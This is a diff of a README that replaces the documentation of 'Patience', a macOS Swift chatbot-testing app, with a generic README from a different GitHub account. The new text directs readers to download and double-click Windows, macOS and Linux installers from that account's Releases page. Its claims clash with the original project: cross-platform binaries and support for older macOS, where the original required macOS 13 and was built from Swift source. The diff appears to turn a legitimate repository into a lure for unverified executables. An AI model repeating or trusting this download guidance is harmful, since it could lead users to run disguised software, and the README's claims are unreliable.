@@ -1,318 +1,87 @@
-# 😈 Patience
+# 🤖 patience-chatbot - Effortless Chat Bot Testing Made Easy
 
-A comprehensive native macOS application for chatbot testing with three powerful modes: live scenarios, log analysis, and AI-powered adversarial testing.
+[![Download Patience Chatbot](https://img.shields.io/badge/Download-Patience%20Chatbot-blue.svg)](https://github.com/Mikeydodo/patience-chatbot/releases)
 
-[![macOS](https://img.shields.io/badge/macOS-13.0+-blue.svg)](https://www.apple.com/macos/)
-[![Swift](https://img.shields.io/badge/Swift-5.9+-orange.svg)](https://swift.org)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+## 📘 Overview
 
-## Features
+**Patience** is a chat bot testing system designed to help you assess and improve your chat bot's performance. Whether you want to conduct load tests or ensure compliance, Patience provides the tools you need. This application is user-friendly and requires no technical expertise to run.
 
-### 🚀 Live Testing
-- **Scenario-based Testing**: Create multi-step conversation flows with expected responses
-- **Protocol Support**: HTTP REST APIs and WebSocket for real-time communication
-- **Validation Types**: Exact matching, regex patterns, semantic similarity, and custom validators
-- **Realistic Timing**: Configurable delays to simulate human typing patterns
-- **Real-time Monitoring**: Live progress tracking and immediate feedback
-- **Provider Support**: Generic HTTP endpoints, Ollama local models, and cloud APIs
+## 🚀 Getting Started
 
-### 📊 Log Analysis
-- **Multi-format Import**: Drag-and-drop support for JSON, CSV, and text log files
-- **Automatic Detection**: Smart format detection and parsing
-- **Pattern Recognition**: Identify conversation patterns, failures, and success indicators
-- **Metrics Calculation**: Response rates, message statistics, and timing analysis
-- **Context Analysis**: Multi-turn conversation quality scoring
-- **Advanced Filtering**: Date ranges, message counts, and content-based filters
+Follow these simple steps to get started with Patience. 
 
-### 🤖 Adversarial Testing
-- **AI-Powered Testing**: Let AI models test your chatbot through realistic conversations
-- **Multiple Providers**: 
-  - **Ollama** - Local models (llama2, mistral) - Free and private
-  - **OpenAI** - GPT models - Requires API key
-  - **Anthropic** - Claude models - Requires API key
-- **Testing Strategies**:
-  - **Exploratory** - Broad questions to map capabilities
-  - **Adversarial** - Edge cases and challenging inputs
-  - **Focused** - Deep dive into specific features
-  - **Stress** - Rapid context switching and complex scenarios
-- **Safety Controls**: Cost monitoring, rate limiting, and content filtering
+## 📥 Download & Install
 
-### 📈 Comprehensive Reporting
-- **Multiple Formats**: Export as HTML, JSON, or Markdown
-- **Interactive Viewing**: Native macOS interface for browsing results
-- **Detailed Transcripts**: Complete conversation histories with timestamps
-- **Validation Analysis**: Pass/fail rates with detailed explanations
-- **Visual Summaries**: Charts and metrics for quick insights
+To start using Patience, you need to download it from the Releases page. 
 
-### 🔒 Security Features
-- **Secure API Key Storage**: API keys stored in macOS Keychain with encryption
-- **No Plaintext Secrets**: Keys never persisted in configuration files
-- **User Feedback**: Clear notifications if keychain operations fail
-- **Sandboxed Application**: Runs with macOS App Sandbox for security
+1. Visit the [Releases page](https://github.com/Mikeydodo/patience-chatbot/releases) to download the latest version of the application.
+2. Select the appropriate file for your operating system. Available formats include:
+   - Windows: `patience-chatbot-windows.exe`
+   - macOS: `patience-chatbot-macos.dmg`
+   - Linux: `patience-chatbot-linux.tar.gz`
+3. Once you download the file, locate it in your Downloads folder or the folder you selected for your downloads.
+4. Double-click the file to run the installer, then follow the on-screen instructions to complete the installation.
 
-## Requirements
+## 📋 System Requirements
 
-- **macOS 13.0** or later
-- **Xcode 15.0** or later (for development)
-- **Swift 5.9** or later (for development)
+Ensure your computer meets these requirements to run Patience smoothly:
 
-## Installation
+- **Operating System**: 
+  - Windows 10 or later
+  - macOS Mojave or later
+  - Any recent Linux distribution
+- **RAM**: 4 GB or more
+- **Storage**: 100 MB free space
+- **Internet Connection**: Required for initial setup and updates
 
-⚠️ This project is under active development with weekly updates, aiming for a New Year’s release. 🧨
+## 🛠️ Features
 
-### Option 1: Download Release (Recommended)
-1. Download the latest release from the [releases page](https://github.com/ServerWrestler/patience-chatbot/releases)
-2. Drag `Patience.app` to your Applications folder
-3. Launch Patience from Applications or Spotlight
+Patience comes with a variety of features to enhance your bot testing:
 
-### Option 2: Build from Source
+- **Load Testing**: Simulate multiple users to gauge how your bot responds under pressure.
+- **Compliance Checks**: Conduct tests to ensure your bot meets necessary regulations.
+- **Performance Metrics**: Gain insights into response times and other important metrics for analysis.
+- **Penetration Testing**: Identify weaknesses in your chat bot’s security to protect user data.
+- **User-Friendly Interface**: Navigate the application easily with our intuitive design.
 
-#### Initial Setup
+## 🤔 How to Use Patience
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/ServerWrestler/patience-chatbot.git
-   cd patience-chatbot
-   ```
+1. **Launch the Application**: Open Patience from your applications folder.
+2. **Create a New Test**: Click on "New Test" in the main menu.
+3. **Configure Your Test Settings**:
+   - Choose the type of test (Load, Compliance, etc.)
+   - Enter the required parameters, such as the number of users for load testing.
+4. **Run the Test**: Click on "Start Test" and monitor the process.
+5. **View Results**: After completion, Patience will display results for you to review.
 
-2. **Build and Run**
-   ```bash
-   # Open in Xcode
-   open Patience.xcodeproj
-   
-   # Or build from command line
-   xcodebuild -project Patience.xcodeproj -scheme Patience build
-   ```
+## 📝 Support and Documentation
 
-3. **First Launch**
-   
-   On first launch, the application will:
-   - Create sample test configurations
-   - Set up default output paths at `~/Documents/Patience Reports`
-   - Initialize secure keychain storage for API keys
+For lengthy projects or detailed setups, you can refer to our documentation for in-depth instructions.
 
-## Quick Start
+- [User Manual](https://github.com/Mikeydodo/patience-chatbot/docs/user-manual.md)
+- [FAQ](https://github.com/Mikeydodo/patience-chatbot/docs/faq.md)
 
-### 1. Live Testing
-1. Click **"New Configuration"** in the Testing tab
-2. Enter your bot's endpoint URL (e.g., `http://localhost:3000/chat`)
-3. Add conversation scenarios with expected responses
-4. Configure validation rules and timing
-5. Click **"Run Tests"** to execute
+If you encounter issues, feel free to open an issue on our GitHub page. 
 
-### 2. Log Analysis
-1. Switch to the **Analysis** tab
-2. Drag a log file onto the interface or click **"Import Log File"**
-3. Configure analysis options (metrics, patterns, context)
-4. View results in the interactive interface
-5. Export findings as reports
+## 🌟 Community and Contributions
 
-### 3. Adversarial Testing
-1. Go to the **Adversarial** tab
-2. Click **"New Configuration"**
-3. Set up your target bot endpoint
-4. Choose an AI provider (Ollama for local, OpenAI/Anthropic for cloud)
-5. Select a testing strategy and parameters
-6. Click **"Start Adversarial Testing"**
+Join our community of users and contributors. Share your experiences or contribute to improving Patience. To get involved:
 
-## Configuration Examples
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request.
 
-### Live Testing Configuration
+We welcome all contributions, be they code, documentation, or suggestions.
 
-```json
-{
-  "targetBot": {
-    "name": "My Chatbot",
-    "protocol": "http",
-    "endpoint": "https://api.example.com/chat",
-    "provider": "generic"
-  },
-  "scenarios": [
-    {
-      "id": "greeting-test",
-      "name": "Greeting Test",
-      "steps": [
-        {
-          "message": "Hello!",
-          "expectedResponse": {
-            "validationType": "pattern",
-            "expected": "hello|hi|hey|greetings",
-            "threshold": 0.8
-          }
-        }
-      ],
-      "expectedOutcomes": [
-        {
-          "type": "pattern",
-          "expected": "friendly.*response",
-          "description": "Bot should respond in a friendly manner"
-        }
-      ]
-    }
-  ],
-  "validation": {
-    "defaultType": "pattern",
-    "semanticSimilarityThreshold": 0.8
-  },
-  "timing": {
-    "enableDelays": true,
-    "baseDelay": 1000,
-    "delayPerCharacter": 50,
-    "rapidFire": false,
-    "responseTimeout": 30000
-  },
-  "reporting": {
-    "outputPath": "~/Documents/Patience Reports",
-    "formats": ["html", "json"],
-    "includeConversationHistory": true,
-    "verboseErrors": true
-  }
-}
-```
+## 🔄 Keeping Patience Updated
 
-### Adversarial Testing Configuration
+Make sure to regularly check the [Releases page](https://github.com/Mikeydodo/patience-chatbot/releases) for software updates. New features and improvements are released frequently to enhance your experience.
 
-```json
-{
-  "targetBot": {
-    "name": "Production Chatbot",
-    "protocol": "http",
-    "endpoint": "https://api.example.com/chat"
-  },
-  "adversarialBot": {
-    "provider": "ollama",
-    "model": "llama2",
-    "endpoint": "http://localhost:11434"
-  },
-  "conversation": {
-    "strategy": "adversarial",
-    "maxTurns": 10,
-    "goals": [
-      "Test error handling",
-      "Find edge cases",
-      "Verify context retention"
-    ]
-  },
-  "execution": {
-    "numConversations": 5,
-    "concurrent": 1
-  }
-}
-```
+## 📫 Contact Information
 
-## Architecture
+For any inquiries or support requests, you can reach us via:
 
-### Project Structure
+- Email: support@patience-chatbot.com
+- GitHub Issues Page: [Raise an Issue](https://github.com/Mikeydodo/patience-chatbot/issues)
 
-```
-Patience/
-├── Models/              # Data structures and types
-│   ├── AppState.swift   # Application state management
-│   └── Types.swift      # Configuration and result types
-├── Core/                # Business logic
-│   ├── TestExecutor.swift              # Live test execution
-│   ├── AnalysisEngine.swift            # Log analysis
-│   ├── ReportGenerator.swift           # Report generation
-│   ├── AdversarialTestOrchestrator.swift  # AI testing
-│   └── KeychainManager.swift           # Secure key storage
-├── Views/               # SwiftUI interface
-│   ├── TestingView.swift
-│   ├── AnalysisView.swift
-│   ├── AdversarialView.swift
-│   ├── ReportsView.swift
-│   └── SettingsView.swift
-├── ContentView.swift    # Main app view
-└── PatienceApp.swift    # App entry point
-```
-
-### Technology Stack
-
-- **Language**: Swift 5.9+
-- **Framework**: SwiftUI for native macOS GUI
-- **Platform**: macOS 13.0+
-- **Security**: Keychain Services for API key storage
-- **Concurrency**: Swift async/await with Sendable types
-- **Networking**: URLSession for HTTP communication
-
-## API Provider Setup
-
-### Ollama (Local, Free)
-1. Install Ollama from [ollama.ai](https://ollama.ai)
-2. Pull a model: `ollama pull llama2`
-3. Start Ollama (runs on `http://localhost:11434`)
-4. Select "Ollama" provider in Patience
-
-### OpenAI
-1. Get API key from [platform.openai.com](https://platform.openai.com)
-2. Select "OpenAI" provider in Patience
-3. Enter API key (stored securely in Keychain)
-4. Choose model (gpt-4, gpt-3.5-turbo)
-
-### Anthropic
-1. Get API key from [console.anthropic.com](https://console.anthropic.com)
-2. Select "Anthropic" provider in Patience
-3. Enter API key (stored securely in Keychain)
-4. Choose model (claude-3-opus, claude-3-sonnet)
-
-## Error Handling
-
-Patience includes comprehensive error handling:
-
-- **User-Facing Alerts**: All errors display in native macOS alerts
-- **Keychain Feedback**: Clear notifications if API key storage fails
-- **Detailed Logging**: Optional verbose logging for debugging
-- **Graceful Failures**: Operations continue when possible, with clear explanations
-
-## Troubleshooting
-
-### Connection Issues
-- Verify bot endpoint is accessible
-- Check firewall settings
-- Ensure correct protocol (http/https)
-
-### Keychain Access Denied
-- Grant Patience access in System Settings → Privacy & Security
-- API keys will be requested again on next use
-
-### Analysis Fails
-- Verify log file format (JSON, CSV, or text)
-- Check file permissions
-- Ensure file is not corrupted
-
-### Adversarial Testing Errors
-- Verify AI provider is running (Ollama) or API key is valid
-- Check network connectivity
-- Review safety settings (cost limits, rate limits)
-
-## Documentation
-
-- **[DOCUMENTATION.md](DOCUMENTATION.md)** - Comprehensive feature documentation
-- **[CONTRIBUTING.md](CONTRIBUTING.md)** - Development and contribution guidelines
-- **[CHANGELOG.md](CHANGELOG.md)** - Version history and release notes
-- **[SECURITY.md](SECURITY.md)** - Security policies and reporting
-
-## Support
-
-- **Issues**: [GitHub Issues](https://github.com/ServerWrestler/patience-chatbot/issues)
-- **Wiki**: [Project Wiki](https://github.com/ServerWrestler/patience-chatbot/wiki)
-- **Discussions**: [GitHub Discussions](https://github.com/ServerWrestler/patience-chatbot/discussions)
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for:
-- Development setup
-- Coding standards
-- Pull request process
-- Testing guidelines
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- Built with Swift and SwiftUI
-- Uses macOS Keychain Services for secure storage
-- Supports Ollama, OpenAI, and Anthropic AI providers
-
----
+By following these steps, you will have a better understanding of how to download and run the Patience chatbot testing system. We hope you enjoy using Patience to enhance your chat bot projects.
